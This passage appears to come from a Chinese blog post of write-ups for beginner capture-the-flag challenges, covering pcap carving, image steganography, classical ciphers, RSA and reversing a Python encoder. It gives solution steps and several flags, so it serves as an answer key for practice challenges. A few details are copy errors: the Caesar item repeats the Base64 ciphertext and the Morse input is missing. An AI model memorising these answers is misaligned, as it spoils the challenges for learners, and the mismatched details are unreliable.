</span></span></code></pre></div><p>获得<code>flag</code>。</p><h3 id=功夫再高也怕菜刀>功夫再高也怕菜刀<a hidden class=anchor aria-hidden=true href=#功夫再高也怕菜刀>#</a></h3><blockquote><p>Des：菜狗决定用菜刀和菜鸡决一死战。</p></blockquote><p>题目给了一个后缀为<code>.pcapng</code>的文件，用<code>binwalk</code>看看。</p><p>使用命令<code>binwalk -e</code>分离文件，有一个空的<code>flag.txt</code>文件，用<code>Wireshark</code>打开原始文件看看，查找<code>flag.txt</code>字段。</p><p>第<code>189</code>个包、<code>195</code>个包、<code>639</code>个包、第<code>641</code>个包都一样。</p><p>第<code>1150</code>个包，多了一张<code>6666.jpg</code>图片。</p><p>右键第<code>1150</code>个包，追踪<code>TCP数据流</code>。</p><p>把高亮及后面的数据进行复制，然后在<code>WinHex</code>里新建一个文件，粘贴过去，文件大小不要太小就行，格式选择<code>ASCII Hex</code>。</p><p>然后<code>Ctrl+S</code>保存为<code>jpg</code>文件，打开后获得一个密码。</p><p>然后我们将这个文件手动分离出来：<code>dd if=acfff53ce3fa4e2bbe8654284dfc18e1.pcapng of=1.zip skip=1422689 bs=1</code>。</p><p>按密码打开压缩包里的<code>flag.txt</code>。</p><p>获得<code>flag</code>。</p><h3 id=somethin_in_image>somethin_in_image<a hidden class=anchor aria-hidden=true href=#somethin_in_image>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><h3 id=erik-baleog-and-olaf>Erik-Baleog-and-Olaf<a hidden class=anchor aria-hidden=true href=#erik-baleog-and-olaf>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><p><code>binwalk</code>分析，为<code>png</code>图片，改后缀，使用<code>StegSolve</code>查看，<code>绿1</code>通道发现中间有一个二维码。</p><p>截图保存二维码，继续放入<code>StegSolve</code>分通道查看，得到更清楚的二维码。</p><h3 id=hit-the-core>hit-the-core<a hidden class=anchor aria-hidden=true href=#hit-the-core>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><p>使用<code>strings</code>命令查看字符串，发现这么一段内容：</p><pre tabindex=0><code>cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}
</code></pre><p>前几个大写字母中间都隔了<code>4个</code>字符，上<code>python</code>输出一遍：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc{bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv}&#39;</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>3</span>, len(data), <span style=color:#ae81ff>5</span>):
</span></span><span style=display:flex><span>  flag <span style=color:#f92672>+=</span> data[i]
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><h3 id=glance-50>glance-50<a hidden class=anchor aria-hidden=true href=#glance-50>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><p>一个<code>gif</code>图片，先看看属性。</p><p><img loading=lazy src=https://cdn.jsdelivr.net/gh/oopsdc/PicBed@main/uPic/XCUAcI-20220820105815989.jpg alt=XCUAcI.jpg></p><p>可知宽度明显不对，<code>WinHex</code>打开修改。</p><h2 id=crypto>Crypto<a hidden class=anchor aria-hidden=true href=#crypto>#</a></h2><h3 id=flag-in-your-hand>flag in your hand<a hidden class=anchor aria-hidden=true href=#flag-in-your-hand>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><h3 id=base64>base64<a hidden class=anchor aria-hidden=true href=#base64>#</a></h3><blockquote><p>Des：元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。。</p></blockquote><p>给了一个txt文档，内容:<code>Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9</code>，<a href=https://base64.us/>Base64 在线编码解码 | Base64 加密解密 - Base64.us</a>。</p><p>获得<code>flag</code>。</p><h3 id=caesar>Caesar<a hidden class=anchor aria-hidden=true href=#caesar>#</a></h3><blockquote><p>Des：你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了。</p></blockquote><p>给了一个<code>txt</code>文档，内容:<code>Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9</code>，<a href=https://www.qqxiuzi.cn/bianma/kaisamima.php>凯撒密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a>，尝试不同的位数。</p><p>获得<code>flag</code>。</p><h3 id=morse>Morse<a hidden class=anchor aria-hidden=true href=#morse>#</a></h3><blockquote><p>Des：小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)。</p></blockquote><p><code>txt</code>文档内容:<code> </code>。</p><p>上脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110&#39;</span>
</span></span><span style=display:flex><span>str <span style=color:#f92672>=</span> str<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;1&#39;</span>, <span style=color:#e6db74>&#39;-&#39;</span>)
</span></span><span style=display:flex><span>str <span style=color:#f92672>=</span> str<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;0&#39;</span>, <span style=color:#e6db74>&#39;.&#39;</span>)
</span></span><span style=display:flex><span>str <span style=color:#f92672>=</span> str<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dic <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#75715e># 26 个英文字符</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;A&#39;</span>: <span style=color:#e6db74>&#39;.-&#39;</span>, <span style=color:#e6db74>&#39;B&#39;</span>: <span style=color:#e6db74>&#39;-...&#39;</span>, <span style=color:#e6db74>&#39;C&#39;</span>: <span style=color:#e6db74>&#39;-.-.&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;D&#39;</span>: <span style=color:#e6db74>&#39;-..&#39;</span>, <span style=color:#e6db74>&#39;E&#39;</span>: <span style=color:#e6db74>&#39;.&#39;</span>, <span style=color:#e6db74>&#39;F&#39;</span>: <span style=color:#e6db74>&#39;..-.&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;G&#39;</span>: <span style=color:#e6db74>&#39;--.&#39;</span>, <span style=color:#e6db74>&#39;H&#39;</span>: <span style=color:#e6db74>&#39;....&#39;</span>, <span style=color:#e6db74>&#39;I&#39;</span>: <span style=color:#e6db74>&#39;..&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;J&#39;</span>: <span style=color:#e6db74>&#39;.---&#39;</span>, <span style=color:#e6db74>&#39;K&#39;</span>: <span style=color:#e6db74>&#39;-.-&#39;</span>, <span style=color:#e6db74>&#39;L&#39;</span>: <span style=color:#e6db74>&#39;.-..&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;M&#39;</span>: <span style=color:#e6db74>&#39;--&#39;</span>, <span style=color:#e6db74>&#39;N&#39;</span>: <span style=color:#e6db74>&#39;-.&#39;</span>, <span style=color:#e6db74>&#39;O&#39;</span>: <span style=color:#e6db74>&#39;---&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;P&#39;</span>: <span style=color:#e6db74>&#39;.--.&#39;</span>, <span style=color:#e6db74>&#39;Q&#39;</span>: <span style=color:#e6db74>&#39;--.-&#39;</span>, <span style=color:#e6db74>&#39;R&#39;</span>: <span style=color:#e6db74>&#39;.-.&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;S&#39;</span>: <span style=color:#e6db74>&#39;...&#39;</span>, <span style=color:#e6db74>&#39;T&#39;</span>: <span style=color:#e6db74>&#39;-&#39;</span>, <span style=color:#e6db74>&#39;U&#39;</span>: <span style=color:#e6db74>&#39;..-&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;V&#39;</span>: <span style=color:#e6db74>&#39;...-&#39;</span>, <span style=color:#e6db74>&#39;W&#39;</span>: <span style=color:#e6db74>&#39;.--&#39;</span>, <span style=color:#e6db74>&#39;X&#39;</span>: <span style=color:#e6db74>&#39;-..-&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Y&#39;</span>: <span style=color:#e6db74>&#39;-.--&#39;</span>, <span style=color:#e6db74>&#39;Z&#39;</span>: <span style=color:#e6db74>&#39;--..&#39;</span>,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 10 个数字</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;0&#39;</span>: <span style=color:#e6db74>&#39;-----&#39;</span>, <span style=color:#e6db74>&#39;1&#39;</span>: <span style=color:#e6db74>&#39;.----&#39;</span>, <span style=color:#e6db74>&#39;2&#39;</span>: <span style=color:#e6db74>&#39;..---&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;3&#39;</span>: <span style=color:#e6db74>&#39;...--&#39;</span>, <span style=color:#e6db74>&#39;4&#39;</span>: <span style=color:#e6db74>&#39;....-&#39;</span>, <span style=color:#e6db74>&#39;5&#39;</span>: <span style=color:#e6db74>&#39;.....&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;6&#39;</span>: <span style=color:#e6db74>&#39;-....&#39;</span>, <span style=color:#e6db74>&#39;7&#39;</span>: <span style=color:#e6db74>&#39;--...&#39;</span>, <span style=color:#e6db74>&#39;8&#39;</span>: <span style=color:#e6db74>&#39;---..&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;9&#39;</span>: <span style=color:#e6db74>&#39;----.&#39;</span>,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 16 个特殊字符</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;,&#39;</span>: <span style=color:#e6db74>&#39;--..--&#39;</span>, <span style=color:#e6db74>&#39;.&#39;</span>: <span style=color:#e6db74>&#39;.-.-.-&#39;</span>, <span style=color:#e6db74>&#39;:&#39;</span>: <span style=color:#e6db74>&#39;---...&#39;</span>, <span style=color:#e6db74>&#39;;&#39;</span>: <span style=color:#e6db74>&#39;-.-.-.&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;?&#39;</span>: <span style=color:#e6db74>&#39;..--..&#39;</span>, <span style=color:#e6db74>&#39;=&#39;</span>: <span style=color:#e6db74>&#39;-...-&#39;</span>, <span style=color:#e6db74>&#34;&#39;&#34;</span>: <span style=color:#e6db74>&#39;.----.&#39;</span>, <span style=color:#e6db74>&#39;/&#39;</span>: <span style=color:#e6db74>&#39;-..-.&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;!&#39;</span>: <span style=color:#e6db74>&#39;-.-.--&#39;</span>, <span style=color:#e6db74>&#39;-&#39;</span>: <span style=color:#e6db74>&#39;-....-&#39;</span>, <span style=color:#e6db74>&#39;_&#39;</span>: <span style=color:#e6db74>&#39;..--.-&#39;</span>, <span style=color:#e6db74>&#39;(&#39;</span>: <span style=color:#e6db74>&#39;-.--.&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;)&#39;</span>: <span style=color:#e6db74>&#39;-.--.-&#39;</span>, <span style=color:#e6db74>&#39;$&#39;</span>: <span style=color:#e6db74>&#39;...-..-&#39;</span>, <span style=color:#e6db74>&#39;&amp;&#39;</span>: <span style=color:#e6db74>&#39;. . . .&#39;</span>, <span style=color:#e6db74>&#39;@&#39;</span>: <span style=color:#e6db74>&#39;.--.-.&#39;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decode</span>(x):
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> x:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>:
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39; &#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            change <span style=color:#f92672>=</span> dict(map(<span style=color:#66d9ef>lambda</span> t:(t[<span style=color:#ae81ff>1</span>], t[<span style=color:#ae81ff>0</span>]), dic<span style=color:#f92672>.</span>items()))
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>+=</span> change[i]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flag
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> decode(str)
</span></span><span style=display:flex><span>print(res<span style=color:#f92672>.</span>lower())
</span></span></code></pre></div><p>获得<code>flag</code>。</p><h3 id=不仅仅是morse>不仅仅是Morse<a hidden class=anchor aria-hidden=true href=#不仅仅是morse>#</a></h3><blockquote><p>Des：“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}。</p></blockquote><p>先把<code>/</code>符号给替换成空格<code> </code>，然后进行莫斯解密，上脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;txt content&gt;&#39;</span>
</span></span><span style=display:flex><span>print(s<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;/&#39;</span>, <span style=color:#e6db74>&#39; &#39;</span>))
</span></span></code></pre></div><p><code>HHHH</code>之后的字母全为<code>A</code>和<code>B</code>，猜测是培根加密，<a href=https://tool.bugku.com/peigen/>在线工具|培根密码加解密 (bugku.com)</a>：</p><pre tabindex=0><code>ATTACKANDDEFENCEWORLDISINTERESTING
attackanddefenceworldisinteresting
</code></pre><p>获得<code>flag</code>。</p><h3 id=混合编码>混合编码<a hidden class=anchor aria-hidden=true href=#混合编码>#</a></h3><blockquote><p>Des：经过了前面那么多题目的历练，耐心细致在解题当中是必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}。</p></blockquote><p><code>Base64</code>解码，</p><p><code>ASCII</code>解码：</p><pre tabindex=0><code>LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw
</code></pre><p><code>Base64</code>解码：</p><pre tabindex=0><code>/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100
</code></pre><p><code>ASCII</code>转字符：</p><pre tabindex=0><code>welcometoattackanddefenceworld
</code></pre><p>获得<code>flag</code>。</p><h3 id=幂数加密>幂数加密<a hidden class=anchor aria-hidden=true href=#幂数加密>#</a></h3><blockquote><p>Des：你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}。</p></blockquote><p><code>txt</code>内容：</p><pre tabindex=0><code>8842101220480224404014224202480122
</code></pre><p>获得<code>flag</code>。</p><h3 id=railfence>Railfence<a hidden class=anchor aria-hidden=true href=#railfence>#</a></h3><blockquote><p>Des：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。</p></blockquote><p><code>txt</code>内容：</p><pre tabindex=0><code>ccehgyaefnpeoobe{lcirg}epriec_ora_g
</code></pre><p>用栅栏解密试试，开头有一点相似，但解不出来&mldr;<code>W型栅栏加密</code>，http://www.atoolbox.net/Tool.php?Id=777，按照提示栏数为<code>5</code>。</p><p>获得<code>flag</code>。</p><h3 id=easy-rsa>easy RSA<a hidden class=anchor aria-hidden=true href=#easy-rsa>#</a></h3><blockquote><p>Des：解答出来了上一个题目的你现在可是春风得意，你们走向了下一个题目所处的地方 你一看这个题目傻眼了，这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼，小鱼哈哈一笑 ，让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二，小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}。</p></blockquote><p><code>txt</code>内容：</p><pre tabindex=0><code>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17
求解出d
</code></pre><p><code>python</code>脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 分解大整数</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> math
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 求欧拉函数f(n)</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getEuler</span>(prime1, prime2):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (prime1<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>*</span>(prime2<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 19d - 920071380k = 1</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 求私钥 d</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getDkey</span>(e, eulerValue): <span style=color:#75715e># 辗转相除</span>
</span></span><span style=display:flex><span>    k <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (((eulerValue <span style=color:#f92672>*</span> k) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> e) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            (d, m) <span style=color:#f92672>=</span> divmod(eulerValue <span style=color:#f92672>*</span> k <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, e)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> d    <span style=color:#75715e># 避免科学计数失去精度</span>
</span></span><span style=display:flex><span>        k <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 求明文</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getPlain</span>(c, d, n):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> pow(c, d, n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    p <span style=color:#f92672>=</span> <span style=color:#ae81ff>473398607161</span>
</span></span><span style=display:flex><span>    q <span style=color:#f92672>=</span> <span style=color:#ae81ff>4511491</span>
</span></span><span style=display:flex><span>    d <span style=color:#f92672>=</span> getDkey(<span style=color:#ae81ff>17</span>, getEuler(p, q))
</span></span><span style=display:flex><span>    print(d)
</span></span></code></pre></div><p>获得<code>flag</code>。</p><h3 id=easychallenge>easychallenge<a hidden class=anchor aria-hidden=true href=#easychallenge>#</a></h3><blockquote><p>Des：你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。</p></blockquote><p>题目给了一个<code>pyc</code>文件，需要进行反编译。在<code>python</code>环境配置好的基础上，<code>pip install uncompyle</code>进行工具安装，然后使用命令<code>uncompyle filename</code>进行反编译，得到如下源代码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encode1</span>(ans):
</span></span><span style=display:flex><span>  s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> ans:
</span></span><span style=display:flex><span>    x <span style=color:#f92672>=</span> ord(i) <span style=color:#f92672>^</span> <span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>    x <span style=color:#f92672>=</span> x <span style=color:#f92672>+</span> <span style=color:#ae81ff>25</span>
</span></span><span style=display:flex><span>    s <span style=color:#f92672>+=</span> chr(x)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encode2</span>(ans):
</span></span><span style=display:flex><span>  s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> ans:
</span></span><span style=display:flex><span>    x <span style=color:#f92672>=</span> ord(i) <span style=color:#f92672>+</span> <span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>    x <span style=color:#f92672>=</span> x <span style=color:#f92672>^</span> <span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>    s <span style=color:#f92672>+=</span> chr(x)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encode3</span>(ans):
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> base64<span style=color:#f92672>.</span>b32encode(ans)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#39;Please Input your flag:&#39;</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> raw_input()
</span></span><span style=display:flex><span>final <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> encode3(encode2(encode1(flag))) <span style=color:#f92672>==</span> final:
</span></span><span style=display:flex><span>  print <span style=color:#e6db74>&#39;correct&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>  print <span style=color:#e6db74>&#39;error&#39;</span>
</span></span></code></pre></div><p>解密脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decode3</span>(ans):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> base64<span style=color:#f92672>.</span>b32decode(ans)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decode2</span>(ans):
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> ans:
</span></span><span style=display:flex><span>        i <span style=color:#f92672>=</span> i <span style=color:#f92672>^</span> <span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>        x <span style=color:#f92672>=</span> i <span style=color:#f92672>-</span> <span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>        s <span style=color:#f92672>+=</span> chr(x)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decode1</span>(ans):
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> ans:
</span></span><span style=display:flex><span>        i <span style=color:#f92672>=</span> ord(i) <span style=color:#f92672>-</span> <span style=color:#ae81ff>25</span>
</span></span><span style=display:flex><span>        x <span style=color:#f92672>=</span> i <span style=color:#f92672>^</span> <span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>        s <span style=color:#f92672>+=</span> chr(x)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&#39;</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> decode1(decode2(decode3(flag)))
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><p>获得<code>flag</code>。</p><h3 id=转轮机加密>转轮机加密<a hidden class=anchor aria-hidden=true href=#转轮机加密>#</a></h3><blockquote><p>Des：你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿:“嗨呀！我知道 是什么东西了！”。提示:托马斯·杰斐逊。 flag，是字符串，小写。</p></blockquote><p>上网查询了一下转轮机加密，做题思路如下：</p><p>先根据密钥对各行进行替换，然后根据密文，对第一列元素进行排列，对每行元素进行循环，每一列列出来，<code>Des</code>中提到了二战，唯一读的通顺的就是</p><pre tabindex=0><code>18:FIREINTHEHOLE
